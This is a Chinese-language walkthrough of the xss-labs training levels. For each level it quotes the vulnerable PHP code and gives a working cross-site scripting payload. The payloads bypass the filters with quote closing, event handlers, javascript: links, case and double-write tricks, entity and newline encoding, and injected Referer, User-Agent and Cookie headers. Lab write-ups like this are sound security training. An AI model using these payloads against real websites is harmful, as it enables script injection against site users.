## less 1

简单的xss漏洞 GET的传参方式 源码:

```php
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
```

此处可以看到 传参的时候没有做任何过滤 直接payload 最简单的xss

```php
?name=<script>alert(/xss/)</script>
```

* * *

## less 2

```php
<script>alert(/xss)</script> //先输入同样的代码 查看输入源码
<input name="keyword" value="<script>alert(/xss)</script>">
```

发现参数被传到了value里面 引号包裹起来了 这不会被执行 尝试闭合前面的引号

```php
"> <script>alert(/xss/)</script> //
```

使用"> 闭合前面预置的<" 让`<script>alert(/xss/)</script>`变成一个单独的命令执行  
//注释掉后面多余的语句 避免影响代码运行

* * *

## less 3

输入`"> <script>alert(/xss)</script>` 查看源码:

```php
<input name="keyword" value="&quot;> <script>alert(/xss)</script>">
```

发现被引号被实体化了 查看php源码

```php
<input name=keyword  value='".htmlspecialchars($str)."'>
// htmlspecialchars() 函数把预定义的字符转换为 HTML 实体
```

尝试闭合 发现当输入 ’ 的时候 前面“”会被闭合

```php
<input name="keyword" value="" qwe'="">
```

构造语句

```php
' <script>alert(/xss/)</script>
<input name="keyword" value="" &lt;script&gt;alert(="" xss="" )&lt;="" script&gt;'="">
```

发现<>都会被实体化 这时候就要想到利用没有尖括号的事件来执行弹窗  
常见的事件有 onerror onload onfocus…  
这里利用onfocus

```php
<input type="text" id="fname" onfocus=onfocus=alert(/xss/)>
//执行语句后 鼠标点击文本框就会弹窗 
```

构造语句：`' onfocus=alert(/xss/)`  
点击输入框 没有弹窗出现 查看源码

```php
<input name="keyword" value="" onfocus="alert(/xss/)'">
```

发现后面还存在一个单独的引号没有被闭合 这里不能使用//注释 所以手动添加一个引号起到闭合作用  
Payload：`' onfocus=alert(/xss/) '`

* * *

## less 4

输入`<script>alert(/xss/)</script>` 查看表单提交的源代码

```php
<input name="keyword" value="scriptalert(/xss/)/script">
    //可以看到<>都已经被替换成空白字符了
```

代审:

```php
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
//用到了str_replace替换函数和htmlspecialchars实体化函数
```

继续尝试找到闭合方式

```php
' qwe
<input name="keyword" value="' qwe">
" qwe //
<input name="keyword" value="" qwe="" "="">	// 发现前面已经被闭合了 并且注释符找不到了
```

开始构造Payload

```php
" onfocus=alert(/xss/) '
<input name="keyword" value="" onfocus="alert(/xss/)" '"="">
```

* * *

## less 5

```php
<script>alert(/xss/)</script>
<input name="keyword" value="<scr_ipt>alert(/xss/)</script>">
```

代审

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

尝试大小写绕过 `o_nfocus=alert(/xss/)` 不起作用  
这里替换字符只是对<script做了检测 可以想到用javascript的**伪协议**来绕过 先找到闭合方式:

```php
"> //
<input name="keyword" value="">"&gt; //成功闭合
```

闭合后在后面重新构造新的语句  
payload:

```php
"> <a href=javascript:alert(/xss/)>傻逼sbf</a> 
```

点击构造出来的超链接 指向 `javascript:alert(/xss/)`

* * *

## less 6

找到闭合方式 "> 可以构造后面的语句

```php
"> <a href=javascript:alert(/xss/)>qwe</a>
<a hr_ef="javascript:alert(/xss/)">qwe</a> //发现href被转义了
```

尝试大小写绕过?  
payload:

```php
"> <a HREf=javascript:alert(/xss/)>qwe</a>
```

成功绕过

* * *

## less 7

```php
<script>alert(/xss/)</script>
<input name="keyword" value="<>alert(/xss/)</>"> //发现script都被替换成空了
```

尝试用" 闭合 发现<>都会被实体化 所以只能采用事件的方式触发alert  
这里我用了onfocus

```php
" onfocus=alert(/xss/)
<input name="keyword" value="" focus="alert(/xss/)&quot;">
//onfocus变成了focus on被转义了
```

尝试大小写绕过

```php
" Onfocus=alert(/xss/)
<input name="keyword" value="" focus="alert(/xss/)&quot;">
```

尝试双写绕过(payload)

```php
" oonnfocus=alert(/xss/) //
//成功绕过 弹窗
```

* * *

## less 8

```php
<a href=javascript:alert(/xss)></a>
<a href="<a hr_ef=javascr_ipt:alert(/xss)></a>">友情链接</a>
    //href被转义 尝试绕过都不行
```

在验证很严格的情况下 应该想到编码绕过:
这里使用unicode编码来绕过 (十六进制) payload:

```php
javascrip&#x74:alert(/xss/)
<a href="javascript:alert(/xss/)">友情链接</a>
```

成功绕过

------

## less 9

尝试大小写 双写 发现参数传不到下面 查看源码:

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
```

这里的if是来判断是否有http://这个字符串 不然就不让传参 所以尝试在正常的代码中插入http:// 开始尝试:

```php
/*http://*/javascript:alert(/xss/)
<a href="javascr_ipt:alert(/xss/)//http://">友情链接</a>
```

发现http://不会被注释掉 放在后面呢？ payload:

```php
javascrip&#x74:alert(/xss/)//http://
<a href="javascript:alert(/xss/)//http://">友情链接</a>
```

------

## less 10

代码审计:

```php
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
```

这里$str没有输出（传参点）所以可以把重点放在$str11上面 也就是GET方式提交的t_sort 构造url:

```php
?t_sort=<script>alert(/xss/)</script>
<input name="t_sort" value="scriptalert(/xss/)/script" type="hidden">
```

发现传进去的参数被value值包裹了 + html实体化  尝试闭合value值:

```php
?t_sort=" qwe
<input name="t_sort" value="" qwe"="" type="hidden">
```

成功闭合 开始构造语句:

```php
//这边用 HTML onmouseover 事件属性 来构造
<input name="t_sort" value="" onmouseover="alert(1)" ""="" type="hidden">
```

```php
	//注意最后面的引号闭合（详解）
<input name="t_sort"  value="'.$str33.'" type="hidden">
//现在最前面输入一个引号闭合前面预置的引号 :
<input name="t_sort"  value="'.$str33.'" " type="hidden">
//"'.$str33.'" 就成为了一个单独的一个值
后面就可以跟上想要构造的语句了 然后最后在后面闭合前面我们构造的引号 变成下面的代码
<input name="t_sort"  value="'.$str33.'" " qweqweqwe " type="hidden">
```

值得注意的是这边input的type是hidden 也就是隐藏域 我们利用鼠标事件的时候 要把隐藏域显示出来 那就要在前面重新构造一个type顶掉后面预置的type payload如下:

```php
?t_sort=" type="text" onmouseover=alert(1) "
```

------

## less 11

代审 传参点ref头部 利用burp抓包改代码：

```php
Referer: " type="text" onmouseover="alert(1) 
```

前面引号闭合预置引号 type顶掉后面的隐藏域 onmouserover触发条件 "alert(1) 刚好和后面的引号闭合 完成弹窗

```php
<input name="t_ref"  value="" type="text" onmouseover="alert(1)" type="hidden">
    //完整代码
```



------

## less 12

源码发现

```php
<input name="t_ua" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0" type="hidden">
```

是基于uagent的吗？ 抓包尝试:

```php
User-Agent: " qwe
<input name="t_ua"  value="" qwe" type="hidden">
```

可以闭合 继续尝试

```php
User-Agent: " type="text" onmouseover="alert(/xss/)
```

成功弹窗

------

## less 13

```php
http://localhost/xss-labs-master/level13.php?keyword=qwe
<input name="t_cook" value="call me maybe?" type="hidden">
```

是基于cookie的吗 抓包尝试:

```php
Cookie: user=" qwe
<input name="t_cook"  value="" qwe" type="hidden">
//可以闭合
```

进一步构造代码:

```php
Cookie: user=" type="text" onmouseover=" alert(/xss/) 
<input name="t_cook"  value="" type="text" onmouseover=" alert(/xss/)" type="hidden">
```

成功弹窗

------

## less 15(less14因为网站404问题无法进行 跳过)

改url（" 尝试闭合） 调试器里的
<body><span class="ng-include:&quot;"></span></body> 有修改
继续尝试

```php
?src='level1.php'
<body><span class="ng-include:'level1.php'"></span></body>
```

**成功包含了level1.php的页面 那就在level1中做一个xss 然后包含这个页面让level14来执行level1的xss 开始尝试:**

```php
?src='level1.php?name=qwe'
//可以显示level1的传参查询
?src='level1.php?name=<script>alert(1)</script>'
<script>alert(1)</script> //单独作为一句话存在源码中 script标签没有被执行 
```

尝试换一个标签

```php
?src='level1.php?name=<img src=x onerror=alert(/xss/)>'
```

成功弹窗

------

## less 16

```php
?keyword=<script>alert(/xss/)</script>
<center>&lt;&nbsp;&gt;alert(&nbsp;xss&nbsp;)&lt;&nbsp;&nbsp;&gt;</center>
```

过滤的很严格 尝试其他标签

```php
?keyword=<img src=x onerror=alert(/xss/)>
<img&nbsp;src=x&nbsp;onerror=alert(&nbsp;xss&nbsp;)>
```

发现把空格全部都过滤了 尝试编码绕过？

```php
?keyword=<img%0Dsrc=x%0Donerror=alert(1)> //%0d为回车(换行符)
```

成功弹窗

------

## less 17

```php
http://localhost/xss-labs-master/level17.php?arg01=%20onmousemove&arg02=alert(1)
<embed src="xsf01.swf?" onmousemove="alert(1)" width="100%" heigth="100%">
```

不知道为什么不弹窗 整体就是利用空格把1的参数顶到外面 2的参数和1拼接 形成一个新的参数

